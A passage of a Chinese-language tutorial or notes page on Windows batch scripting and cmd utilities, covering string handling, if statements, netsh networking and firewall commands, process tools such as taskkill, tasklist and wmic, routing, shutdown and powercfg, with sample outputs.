<h2 id="9-字符串操作"><a href="#9-字符串操作" class="headerlink" title="9. 字符串操作"></a>9. 字符串操作</h2><h3 id="9-1-字符串替换"><a href="#9-1-字符串替换" class="headerlink" title="9.1. 字符串替换"></a>9.1. 字符串替换</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> str=aaaa bb cc</span><br><span class="line">:: 所有b替换成t</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%str:b=t%</span></span><br><span class="line">:: 替换第一个b和之前的字符串</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%str:*b=tt%</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa tt cc</span><br><span class="line">ttb cc</span><br></pre></td></tr></table></figure>

<h3 id="9-2-字符串截取"><a href="#9-2-字符串截取" class="headerlink" title="9.2. 字符串截取"></a>9.2. 字符串截取</h3><p><strong><font color="red"><code>,</code>后大于0为长度，小于0为索引</font></strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> abc=abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 原字符串为:<span class="variable">%abc%</span></span><br><span class="line"><span class="built_in">echo</span> 截取前<span class="number">5</span>个字符:<span class="variable">%abc:~0,5%</span></span><br><span class="line"><span class="built_in">echo</span> 截取最后<span class="number">5</span>个字符:<span class="variable">%abc:~-5%</span></span><br><span class="line"><span class="built_in">echo</span> 截取第一个到倒数第<span class="number">6</span>个字符:<span class="variable">%abc:~1,-5%</span></span><br><span class="line"><span class="built_in">echo</span> 从第<span class="number">4</span>个字符开始截取<span class="number">5</span>个字符:<span class="variable">%abc:~3,5%</span></span><br><span class="line"><span class="built_in">echo</span> 从倒数第<span class="number">14</span>个字符开始截取<span class="number">5</span>个字符:<span class="variable">%abc:~-14,5%</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原字符串为:abcdefghijklmnopqrstuvwxyz</span><br><span class="line">截取前5个字符:abcde</span><br><span class="line">截取最后5个字符:vwxyz</span><br><span class="line">截取第一个到倒数第6个字符:bcdefghijklmnopqrstu</span><br><span class="line">从第4个字符开始截取5个字符:defgh</span><br><span class="line">从倒数第14个字符开始截取5个字符:mnopq</span><br></pre></td></tr></table></figure>

<h2 id="10-引号的作用"><a href="#10-引号的作用" class="headerlink" title="10. 引号的作用"></a>10. 引号的作用</h2><ul>
<li>引号作为字符串插入，不作为字符串的标识</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> str=aaa</span><br><span class="line"><span class="built_in">set</span> str1=&quot;aaa&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%str%</span> <span class="number">123</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%str1%</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa 123</span><br><span class="line">&quot;aaa&quot; 123</span><br></pre></td></tr></table></figure>

<h2 id="11-if判断"><a href="#11-if判断" class="headerlink" title="11. if判断"></a>11. if判断</h2><h3 id="11-1-基本形态"><a href="#11-1-基本形态" class="headerlink" title="11.1. 基本形态"></a>11.1. 基本形态</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 基本状态是一行</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">123</span> (<span class="built_in">echo</span> a==<span class="number">123</span>) <span class="keyword">else</span> <span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">1234</span> (<span class="built_in">echo</span> a==<span class="number">123</span>) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="variable">%a%</span> <span class="keyword">not</span> valid)</span><br><span class="line">:: 也可以分行写，但是处理时认为是一行</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">123</span> (</span><br><span class="line">    <span class="built_in">echo</span> a==<span class="number">123</span></span><br><span class="line">) <span class="keyword">else</span> <span class="keyword">if</span> <span class="variable">%a%</span> == <span class="number">1234</span> (</span><br><span class="line">    <span class="built_in">echo</span> a==<span class="number">123</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">%a%</span> <span class="keyword">not</span> valid</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="12-move-移动文件"><a href="#12-move-移动文件" class="headerlink" title="12. move 移动文件"></a>12. move 移动文件</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">move</span> [src] [dst]</span><br></pre></td></tr></table></figure>

<h2 id="13-tracert-跟踪路由节点"><a href="#13-tracert-跟踪路由节点" class="headerlink" title="13. tracert 跟踪路由节点"></a>13. tracert 跟踪路由节点</h2><ul>
<li>类似linux的traceroute</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">tracert</span> 199.200.2.170</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">通过最多 30 个跃点跟踪到 199.200.2.170 的路由</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  1    &lt;1 毫秒   &lt;1 毫秒   &lt;1 毫秒 172.22.73.254</span></span><br><span class="line"><span class="function">  2    &lt;1 毫秒   &lt;1 毫秒   &lt;1 毫秒 10.10.110.132</span></span><br><span class="line"><span class="function">  3     1 <span class="title">ms</span>    &lt;1 毫秒    3 <span class="title">ms</span>  10.10.110.37</span></span><br><span class="line"><span class="function">  4    &lt;1 毫秒   &lt;1 毫秒   &lt;1 毫秒 199.200.2.170</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">跟踪完成。</span></span><br></pre></td></tr></table></figure>

<h2 id="14-netsh-网络相关命令工具"><a href="#14-netsh-网络相关命令工具" class="headerlink" title="14. netsh 网络相关命令工具"></a>14. netsh 网络相关命令工具</h2><h3 id="14-1-通用命令"><a href="#14-1-通用命令" class="headerlink" title="14.1. 通用命令"></a>14.1. 通用命令</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 重置网络配置</span><br><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure>

<h3 id="14-2-ipv6"><a href="#14-2-ipv6" class="headerlink" title="14.2. ipv6"></a>14.2. ipv6</h3><ul>
<li>ipv6使用需要使用<code>netsh interface ipv6</code>命令</li>
</ul>
<h4 id="1-路由相关"><a href="#1-路由相关" class="headerlink" title="1) 路由相关"></a>1) 路由相关</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:::::::::: 查看路由 ::::::::::</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ipv6</span> <span class="title">show</span> <span class="title">route</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">发布    类型     跃点数 前缀                     索引 网关/接口名称</span></span><br><span class="line"><span class="function">------- -------- ---    ------------------------ --- ------------------------</span></span><br><span class="line"><span class="function">否        系统        256  ::1/128                     1  <span class="title">Loopback</span> <span class="title">Pseudo</span>-<span class="title">Interface</span> 1</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">fe80</span>::/64                  21  以太网 2</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">fe80</span>::/64                  27  <span class="title">vEthernet</span> (<span class="title">Default</span> <span class="title">Switch</span>)</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">fe80</span>::5<span class="title">dee</span>:8<span class="title">e08:f0bd</span>:1<span class="title">fad</span>/128   21  以太网 2</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">fe80</span>::6811:502<span class="title">a:c8dd</span>:<span class="title">b09e</span>/128   27  <span class="title">vEthernet</span> (<span class="title">Default</span> <span class="title">Switch</span>)</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">ff00</span>::/8                    1  <span class="title">Loopback</span> <span class="title">Pseudo</span>-<span class="title">Interface</span> 1</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">ff00</span>::/8                   21  以太网 2</span></span><br><span class="line"><span class="function">否        系统        256  <span class="title">ff00</span>::/8                   27  <span class="title">vEthernet</span> (<span class="title">Default</span> <span class="title">Switch</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:::::::::: 添加路由 ::::::::::</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ipv6</span> <span class="title">add</span> <span class="title">route</span></span></span><br><span class="line"><span class="function">一个或多个重要的参数没有输入。</span></span><br><span class="line"><span class="function">请验证需要的参数，然后再次输入。</span></span><br><span class="line"><span class="function">此命令提供的语法不正确。请查看帮助以获取正确的语法信息。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">用法: <span class="title">add</span> <span class="title">route</span> [<span class="title">prefix</span>=]&lt;<span class="title">IPv6</span> <span class="title">address</span>&gt;/&lt;<span class="title">integer</span>&gt; [<span class="title">interface</span>=]&lt;<span class="title">string</span>&gt;</span></span><br><span class="line"><span class="function">             [[<span class="title">nexthop</span>=]&lt;<span class="title">IPv6</span> <span class="title">address</span>&gt;] [[<span class="title">siteprefixlength</span>=]&lt;<span class="title">integer</span>&gt;]</span></span><br><span class="line"><span class="function">             [[<span class="title">metric</span>=]&lt;<span class="title">integer</span>&gt;] [[<span class="title">publish</span>=]<span class="title">no</span>|<span class="title">age</span>|<span class="title">yes</span>]</span></span><br><span class="line"><span class="function">             [[<span class="title">validlifetime</span>=]&lt;<span class="title">integer</span>&gt;|<span class="title">infinite</span>]</span></span><br><span class="line"><span class="function">             [[<span class="title">preferredlifetime</span>=]&lt;<span class="title">integer</span>&gt;|<span class="title">infinite</span>]</span></span><br><span class="line"><span class="function">             [[<span class="title">store</span>=]<span class="title">active</span>|<span class="title">persistent</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">参数:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">       标记                值</span></span><br><span class="line"><span class="function">       <span class="title">prefix</span>            - 要为其添加路由的前缀。</span></span><br><span class="line"><span class="function">       <span class="title">interface</span>         - 接口名称或索引。</span></span><br><span class="line"><span class="function">       <span class="title">nexthop</span>           - 网关地址(如果前缀不在链路上)。</span></span><br><span class="line"><span class="function">       <span class="title">siteprefixlength</span>  - 整个站点的前缀长度(如果在链路上)。</span></span><br><span class="line"><span class="function">       <span class="title">metric</span>            - 路由跃点数。</span></span><br><span class="line"><span class="function">       <span class="title">publish</span>           - 下列其中一个值:</span></span><br><span class="line"><span class="function">                           <span class="title">no</span>: 未在路由播发中播发。</span></span><br><span class="line"><span class="function">                               此为默认值。</span></span><br><span class="line"><span class="function">                           <span class="title">age</span>: 用有限生存时间在路由播发中播发。</span></span><br><span class="line"><span class="function">                           <span class="title">yes</span>: 用无限生存时间在路由播发中播发。</span></span><br><span class="line"><span class="function">       <span class="title">validlifetime</span>     - 路由有效的生存时间。</span></span><br><span class="line"><span class="function">                           默认值是无限。</span></span><br><span class="line"><span class="function">       <span class="title">preferredlifetime</span> - 首选路由生存时间。</span></span><br><span class="line"><span class="function">                           默认值为无限生存时间。</span></span><br><span class="line"><span class="function">       <span class="title">store</span>             - 下列其中一个值:</span></span><br><span class="line"><span class="function">                           <span class="title">active</span>: 更改仅持续到下一次启动。</span></span><br><span class="line"><span class="function">                           <span class="title">persistent</span>: 更改持久有效。此为默认值。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">说明: 为给定前缀添加路由。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">示例:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">       <span class="title">add</span> <span class="title">route</span> 3<span class="title">ffe</span>::/16 &quot;<span class="title">Internet</span>&quot; <span class="title">fe80</span>::1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:::::::::: 删除路由就是将<span class="title">add</span>给成<span class="title">del</span> ::::::::::</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ipv6</span> <span class="title">del</span> <span class="title">route</span> 3<span class="title">ffe</span>::/16 &quot;<span class="title">Internet</span>&quot; <span class="title">fe80</span>::1</span></span><br></pre></td></tr></table></figure>

<h3 id="14-3-ipv4"><a href="#14-3-ipv4" class="headerlink" title="14.3. ipv4"></a>14.3. ipv4</h3><h4 id="1-端口转发"><a href="#1-端口转发" class="headerlink" title="1) 端口转发"></a>1) 端口转发</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 将<span class="number">1234</span>端口的tcp请求转发到<span class="number">445</span> ::</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">1234</span> listenaddress=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> connectport=<span class="number">445</span> connectaddress=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> protocol=tcp</span><br></pre></td></tr></table></figure>

<h4 id="2-dns配置"><a href="#2-dns配置" class="headerlink" title="2) dns配置"></a>2) dns配置</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 显示dns配置</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">show</span> <span class="title">dnsservers</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">接口 &quot;以太网 2&quot; 的配置</span></span><br><span class="line"><span class="function">    通过 <span class="title">DHCP</span> 配置的 <span class="title">DNS</span> 服务器:      223.5.5.5</span></span><br><span class="line"><span class="function">                                          114.114.114.114</span></span><br><span class="line"><span class="function">    用哪个前缀注册:                   只是主要</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">接口 &quot;<span class="title">Loopback</span> <span class="title">Pseudo</span>-<span class="title">Interface</span> 1&quot; 的配置</span></span><br><span class="line"><span class="function">    静态配置的 <span class="title">DNS</span> 服务器:            无</span></span><br><span class="line"><span class="function">    用哪个前缀注册:                   只是主要</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:: 配置为网卡为静态<span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">set</span> <span class="title">dns</span> &quot;以太网 2&quot; <span class="title">static</span> 233.5.5.5</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:: 添加新的静态<span class="title">dns</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">add</span> <span class="title">dns</span> &quot;以太网 2&quot; 114.114.114.114</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:: 恢复<span class="title">dns</span>为<span class="title">dhcp</span>获取</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">set</span> <span class="title">dns</span> &quot;以太网 2&quot; <span class="title">source</span>=<span class="title">dhcp</span></span></span><br></pre></td></tr></table></figure>

<h4 id="3-跃点数（优先级）"><a href="#3-跃点数（优先级）" class="headerlink" title="3) 跃点数（优先级）"></a>3) 跃点数（优先级）</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 查看跃点数</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">show</span> <span class="title">Interface</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Idx</span>     <span class="title">Met</span>         <span class="title">MTU</span>          状态                名称</span></span><br><span class="line"><span class="function">---  ----------  ----------  ------------  ---------------------------</span></span><br><span class="line"><span class="function">  1          75  4294967295  <span class="title">connected</span>     <span class="title">Loopback</span> <span class="title">Pseudo</span>-<span class="title">Interface</span> 1</span></span><br><span class="line"><span class="function"> 17           1        1400  <span class="title">connected</span>     本地连接</span></span><br><span class="line"><span class="function"> 15          25        1500  <span class="title">connected</span>     以太网 5</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:: 设置某个网卡跃点数为特定值</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">set</span> <span class="title">interface</span> &quot;本地连接&quot; <span class="title">metric</span>=100</span></span><br><span class="line"><span class="function">:: 也可以用<span class="title">idx</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">set</span> <span class="title">interface</span> 17 <span class="title">metric</span>=100</span></span><br><span class="line"><span class="function">:: 设置为自动跃点</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">ip</span> <span class="title">set</span> <span class="title">interface</span> 17 <span class="title">metric</span>=<span class="title">auto</span></span></span><br></pre></td></tr></table></figure>

<h4 id="4-ip地址配置"><a href="#4-ip地址配置" class="headerlink" title="4) ip地址配置"></a>4) ip地址配置</h4><h3 id="14-4-防火墙"><a href="#14-4-防火墙" class="headerlink" title="14.4. 防火墙"></a>14.4. 防火墙</h3><h4 id="1-advfirewall-firewall"><a href="#1-advfirewall-firewall" class="headerlink" title="1) advfirewall firewall"></a>1) <code>advfirewall firewall</code></h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 开放<span class="number">1234</span>的tcp端口 ::</span><br><span class="line">netsh advfirewall firewall add rule name=shared_folder action=allow protocol=TCP localport=<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<h2 id="15-taskkill"><a href="#15-taskkill" class="headerlink" title="15. taskkill"></a>15. taskkill</h2><ul>
<li><code>/im [xxx.exe]</code>: 删除某exe的进程</li>
<li><code>/f</code>: 强制删除</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">User</span>&gt;<span class="title">taskkill</span> /<span class="title">f</span> /<span class="title">im</span> <span class="title">appidcertstorecheck.exe</span></span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 11804。</span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 15924。</span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 17120。</span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 16996。</span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 17436。</span></span><br><span class="line"><span class="function">成功: 已终止进程 &quot;<span class="title">appidcertstorecheck.exe</span>&quot;，其 <span class="title">PID</span> 为 9724。</span></span><br></pre></td></tr></table></figure>

<h2 id="16-cmd-调用其他bat脚本"><a href="#16-cmd-调用其他bat脚本" class="headerlink" title="16. cmd 调用其他bat脚本"></a>16. cmd 调用其他bat脚本</h2><ul>
<li><code>/c</code>: 执行后面的命令后结束</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c D:\<span class="built_in">path</span>\to\test.bat</span><br></pre></td></tr></table></figure>

<h2 id="17-tasklist显示进程列表"><a href="#17-tasklist显示进程列表" class="headerlink" title="17. tasklist显示进程列表"></a>17. tasklist显示进程列表</h2><ul>
<li><code>/fi</code>: 过滤器，具体语法查看<code>/?</code></li>
<li><code>/v</code>: 显示详细信息</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">sangfor</span>&gt;<span class="title">tasklist</span> /<span class="title">FI</span> &quot;<span class="title">imagename</span> <span class="title">eq</span> <span class="title">abcdefAgent.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">映像名称                       <span class="title">PID</span> 会话名              会话#       内存使用</span></span><br><span class="line"><span class="function">========================= ======== ================ =========== ============</span></span><br><span class="line"><span class="function"><span class="title">abcdefAgent.exe</span>               6172 <span class="title">Services</span>                   0     20,600 <span class="title">K</span></span></span><br><span class="line"><span class="function"><span class="title">abcdefAgent.exe</span>               7532 <span class="title">RDP</span>-<span class="title">Tcp</span>#1                  1     59,368 <span class="title">K</span></span></span><br><span class="line"><span class="function"><span class="title">abcdefAgent.exe</span>               1424 <span class="title">RDP</span>-<span class="title">Tcp</span>#1                  1     37,668 <span class="title">K</span></span></span><br></pre></td></tr></table></figure>

<h2 id="18-net-启动停止服务"><a href="#18-net-启动停止服务" class="headerlink" title="18. net 启动停止服务"></a>18. net 启动停止服务</h2><h3 id="18-1-启动停止服务"><a href="#18-1-启动停止服务" class="headerlink" title="18.1. 启动停止服务"></a>18.1. 启动停止服务</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">sshd</span></span></span><br><span class="line"><span class="function"><span class="title">OpenSSH</span> <span class="title">SSH</span> <span class="title">Server</span> 服务正在启动 .</span></span><br><span class="line"><span class="function"><span class="title">OpenSSH</span> <span class="title">SSH</span> <span class="title">Server</span> 服务已经启动成功。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">stop</span> <span class="title">sshd</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">OpenSSH</span> <span class="title">SSH</span> <span class="title">Server</span> 服务已成功停止。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="19-wmic-windows管理工具"><a href="#19-wmic-windows管理工具" class="headerlink" title="19. wmic windows管理工具"></a>19. wmic windows管理工具</h2><h3 id="19-1-process-查看进程信息"><a href="#19-1-process-查看进程信息" class="headerlink" title="19.1. process 查看进程信息"></a>19.1. process 查看进程信息</h3><ul>
<li><code>commandline</code>: 命令行参数</li>
<li><code>ProcessId</code>: 进程号</li>
<li><code>Name</code>: 名称，一般是<code>xxx.exe</code></li>
<li><code>caption</code>: 好像和name一样</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">wmic</span> <span class="title">process</span> <span class="title">where</span> <span class="title">caption</span>=&quot;<span class="title">cmd.exe</span>&quot; <span class="title">get</span> <span class="title">caption</span>,<span class="title">commandline</span> /<span class="title">value</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Caption</span>=<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">CommandLine</span>=&quot;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">cmd.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="20-find-findstr"><a href="#20-find-findstr" class="headerlink" title="20. find&#x2F;findstr"></a>20. find&#x2F;findstr</h2><ul>
<li><code>/i</code>: 不区分大小写</li>
<li><code>/v</code>: 不包含</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">wmic</span> <span class="title">process</span> <span class="title">where</span> <span class="title">processid</span>=4384 <span class="title">get</span> <span class="title">commandline</span> /<span class="title">value</span> | <span class="title">find</span> /<span class="title">i</span> &quot;<span class="title">atrustcore</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">CommandLine</span>=<span class="title">aTrustAgent</span> --<span class="title">plugin</span> <span class="title">plugins</span>/<span class="title">aTrustCore</span> --<span class="title">enable</span>-<span class="title">http</span> --<span class="title">enable</span>-<span class="title">event</span>-<span class="title">center</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="21-ERRORLEVEL-上一条命令的返回值"><a href="#21-ERRORLEVEL-上一条命令的返回值" class="headerlink" title="21. %ERRORLEVEL% 上一条命令的返回值"></a>21. %ERRORLEVEL% 上一条命令的返回值</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">wmic</span> <span class="title">process</span> <span class="title">where</span> <span class="title">processid</span>=4384 <span class="title">get</span> <span class="title">commandline</span> /<span class="title">value</span> | <span class="title">find</span> /<span class="title">i</span> &quot;<span class="title">atrustcore</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">CommandLine</span>=<span class="title">aTrustAgent</span> --<span class="title">plugin</span> <span class="title">plugins</span>/<span class="title">aTrustCore</span> --<span class="title">enable</span>-<span class="title">http</span> --<span class="title">enable</span>-<span class="title">event</span>-<span class="title">center</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">echo</span> %<span class="title">ERRORLEVEL</span>%</span></span><br><span class="line"><span class="function">0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">wmic</span> <span class="title">process</span> <span class="title">where</span> <span class="title">processid</span>=4384 <span class="title">get</span> <span class="title">commandline</span> /<span class="title">value</span> | <span class="title">find</span> /<span class="title">i</span> &quot;<span class="title">atrustcore1</span></span></span><br><span class="line"><span class="function"><span class="title">FIND</span>: 参数格式不正确</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">echo</span> %<span class="title">ERRORLEVEL</span>%</span></span><br><span class="line"><span class="function">2</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h2 id="22-route-添加路由"><a href="#22-route-添加路由" class="headerlink" title="22. route 添加路由"></a>22. route 添加路由</h2><ul>
<li><code>-p</code>: 永久生效，默认在重启后会失效</li>
<li><code>-6</code>: ipv6路由，默认ipv4</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">route add <span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> mask <span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span>.<span class="number">0</span> <span class="number">10</span>.<span class="number">242</span>.<span class="number">255</span>.<span class="number">254</span> -p</span><br></pre></td></tr></table></figure>

<h2 id="23-shutdown-关机命令"><a href="#23-shutdown-关机命令" class="headerlink" title="23. shutdown 关机命令"></a>23. shutdown 关机命令</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 进入休眠状态</span><br><span class="line">shutdown /h</span><br><span class="line">:: 关机</span><br><span class="line">shutdown /s /t <span class="number">0</span></span><br><span class="line">:: 重启</span><br><span class="line">shutdown /r</span><br></pre></td></tr></table></figure>

<h2 id="24-powercfg-电源配置"><a href="#24-powercfg-电源配置" class="headerlink" title="24. powercfg 电源配置"></a>24. powercfg 电源配置</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 查看系统电源配置</span><br><span class="line"><span class="function">C:\<span class="title">WINDOWS</span>\<span class="title">system32</span>&gt;<span class="title">powercfg</span> -<span class="title">a</span></span></span><br><span class="line"><span class="function">此系统上没有以下睡眠状态:</span></span><br><span class="line"><span class="function">    待机 (<span class="title">S1</span>)</span></span><br><span class="line"><span class="function">        虚拟机监控程序不支持此待机状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    待机 (<span class="title">S2</span>)</span></span><br><span class="line"><span class="function">        系统固件不支持此待机状态。</span></span><br><span class="line"><span class="function">        虚拟机监控程序不支持此待机状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    待机 (<span class="title">S3</span>)</span></span><br><span class="line"><span class="function">        系统固件不支持此待机状态。</span></span><br><span class="line"><span class="function">        虚拟机监控程序不支持此待机状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    休眠</span></span><br><span class="line"><span class="function">        系统固件不支持休眠。</span></span><br><span class="line"><span class="function">        该虚拟机监控程序不支持休眠。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    待机(<span class="title">S0</span> 低电量待机)</span></span><br><span class="line"><span class="function">        系统固件不支持此待机状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    混合睡眠</span></span><br><span class="line"><span class="function">        待机(<span 